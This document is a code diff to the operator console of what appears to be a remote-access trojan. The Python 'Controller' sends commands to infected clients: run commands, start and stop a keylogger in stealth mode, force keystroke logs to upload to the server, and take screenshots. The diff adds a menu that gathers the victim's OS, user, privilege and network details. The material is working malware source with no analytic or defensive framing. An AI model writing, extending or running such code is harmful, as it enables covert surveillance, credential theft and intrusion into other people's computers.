@@ -171,7 +171,7 @@ class Controller:
             elif choice == "6":
                 self.handle_execute_command(client_id)
             elif choice == "7":
-                self.handle_system_info(client_id)
+                self.handle_detailed_system_info(client_id)
             elif choice == "8":
                 self.keylogger_management_menu(client_id)
             elif choice == "9":
@@ -528,12 +528,12 @@ class Controller:
         })
         
         if result and result.get('success'):
-            print(f"[+] ✅ Keylogger started successfully!")
+            print(f"[+] Keylogger started successfully!")
             print(f"    Log file: {result.get('log_file', 'Unknown')}")
             print(f"    Stealth mode: {result.get('stealth_mode', 'Unknown')}")
         else:
             error = result.get('error', 'Unknown error') if result else 'No response'
-            print(f"[-] ❌ Failed to start keylogger: {error}")
+            print(f"[-] Failed to start keylogger: {error}")
     
     def handle_stop_keylogger(self, client_id):
         confirm = input("Are you sure you want to stop the keylogger? (y/n): ").strip().lower()
@@ -542,11 +542,11 @@ class Controller:
             result = self.send_process_command(client_id, "stop_keylogger")
             
             if result and result.get('success'):
-                print(f"[+] ✅ Keylogger stopped successfully!")
+                print(f"[+] Keylogger stopped successfully!")
                 print(f"    Message: {result.get('message', '')}")
             else:
                 error = result.get('error', 'Unknown error') if result else 'No response'
-                print(f"[-] ❌ Failed to stop keylogger: {error}")
+                print(f"[-] Failed to stop keylogger: {error}")
         else:
             print("[!] Operation cancelled")
     
@@ -576,17 +576,17 @@ class Controller:
                 
         else:
             error = result.get('error', 'Unknown error') if result else 'No response'
-            print(f"[-] ❌ Failed to get keylogger status: {error}")
+            print(f"[-] Failed to get keylogger status: {error}")
     
     def handle_force_upload(self, client_id):
         print(f"\n[+] Forcing keylog upload for {client_id}...")
         result = self.send_process_command(client_id, "get_keylog_data")
         
         if result and not result.get('error'):
-            print(f"[+] ✅ {result.get('message', 'Keylog data sent to server')}")
+            print(f"[+] {result.get('message', 'Keylog data sent to server')}")
         else:
             error = result.get('error', 'Unknown error') if result else 'No response'
-            print(f"[-] ❌ Failed to force upload: {error}")
+            print(f"[-] Failed to force upload: {error}")
 
 
     
@@ -694,6 +694,105 @@ class Controller:
         except Exception as e:
             print(f"[-] Error saving screenshot: {e}")
         
+        
+    def handle_detailed_system_info(self, client_id):
+        """Afficher les informations système détaillées"""
+        print("\n[+] Getting detailed system information...")
+        
+        # Menu pour choisir le type d'info
+        print("\n📊 Detailed System Info Options:")
+        print("1. 🖥️  Full System Overview")
+        print("2. 💻 Operating System Details")
+        print("3. 🔧 Architecture Information")
+        print("4. 👤 User Information")
+        print("5. 🛡️  Privileges Information")
+        print("6. 🌐 Network Information")
+        
+        choice = input("\nSelect info type (1-6): ").strip()
+        
+        actions = {
+            "1": "get_detailed_system_info",
+            "2": "get_os_info", 
+            "3": "get_architecture_info",
+            "4": "get_user_info",
+            "5": "get_privileges_info",
+            "6": "get_network_info"
+        }
+        
+        if choice in actions:
+            result = self.send_process_command(client_id, actions[choice])
+            self.display_detailed_system_info(result, actions[choice])
+        else:
+            print("[-] Invalid option")
+
+    def display_detailed_system_info(self, system_data, info_type):
+        """Afficher les informations système de manière organisée"""
+        if not system_data or system_data.get("error"):
+            error = system_data.get('error', 'Unknown error') if system_data else 'No response'
+            print(f"[-] Failed to get system info: {error}")
+            return
+        
+        print("\n" + "="*60)
+        print("🖥️  DETAILED SYSTEM INFORMATION")
+        print("="*60)
+        
+        if info_type == "get_detailed_system_info":
+            # Affichage complet
+            self._display_os_info(system_data.get('operating_system', {}))
+            self._display_architecture_info(system_data.get('architecture', {}))
+            self._display_user_info(system_data.get('user', {}))
+            self._display_privileges_info(system_data.get('privileges', {}))
+            self._display_network_info(system_data.get('network', {}))
+            
+        elif info_type == "get_os_info":
+            self._display_os_info(system_data.get('operating_system', {}))
+            
+        elif info_type == "get_architecture_info":
+            self._display_architecture_info(system_data.get('architecture', {}))
+            
+        elif info_type == "get_user_info":
+            self._display_user_info(system_data.get('user', {}))
+            
+        elif info_type == "get_privileges_info":
+            self._display_privileges_info(system_data.get('privileges', {}))
+            
+        elif info_type == "get_network_info":
+            self._display_network_info(system_data.get('network', {}))
+    
+    def _display_os_info(self, os_info):
+        print("\n💻 OPERATING SYSTEM")
+        print("-" * 40)
+        for key, value in os_info.items():
+            print(f"{key.replace('_', ' ').title():<20}: {value}")
+    
+    def _display_architecture_info(self, arch_info):
+        print("\n🔧 ARCHITECTURE")
+        print("-" * 40)
+        for key, value in arch_info.items():
+            print(f"{key.replace('_', ' ').title():<20}: {value}")
+    
+    def _display_user_info(self, user_info):
+        print("\n👤 USER INFORMATION")
+        print("-" * 40)
+        for key, value in user_info.items():
+            print(f"{key.replace('_', ' ').title():<20}: {value}")
+    
+    def _display_privileges_info(self, priv_info):
+        print("\n🛡️  PRIVILEGES")
+        print("-" * 40)
+        for key, value in priv_info.items():
+            print(f"{key.replace('_', ' ').title():<20}: {value}")
+    
+    def _display_network_info(self, net_info):
+        print("\n🌐 NETWORK INFORMATION")
+        print("-" * 40)
+        for key, value in net_info.items():
+            if isinstance(value, list):
+                print(f"{key.replace('_', ' ').title():<20}:")
+                for item in value:
+                    print(f"  - {item}")
+            else:
+                print(f"{key.replace('_', ' ').title():<20}: {value}")
         
 if __name__ == "__main__":
     controller = Controller()
